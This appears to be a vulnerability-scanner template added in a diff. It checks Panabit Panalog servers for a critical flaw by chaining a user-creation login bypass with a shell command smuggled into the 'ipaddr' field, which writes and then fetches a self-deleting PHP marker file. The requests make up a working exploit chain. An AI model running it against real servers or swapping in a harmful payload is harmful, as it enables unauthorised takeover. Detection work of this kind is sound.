@@ -1,0 +1,61 @@
+id: panabit-panalog-command-execution
+info:
+  name: Panabit-Panalog Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Panabit log audit system has a command execution vulnerability allowing attackers to gain control over the server.
+  reference:
+    - https://www.panabit.com/cn/product/productX/2017/0522/151.html
+
+http:
+  - raw:
+      - |
+        POST /singleuser_action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"syncInfo":{"operationType":"ADD_USER","user":{"userId":111}}}
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{\"yn\":\"yes\",\"str\":\"OK\"}"
+    extractors:
+      - type: regex
+        name: session_cookie
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?);"
+        internal: true
+
+  - raw:
+      - |
+        GET /singlelogin.php?userId=111 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [302]
+
+  - raw:
+      - |
+        POST /content-apply/apply.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_cookie}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=app_apply&ipaddr=;echo '<?php echo md5(233);unlink(__FILE__);?>'>{{session_cookie}}.php;
+    matchers:
+      - type: status
+        status: [200]
+
+  - raw:
+      - |
+        GET /content-apply/{{session_cookie}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
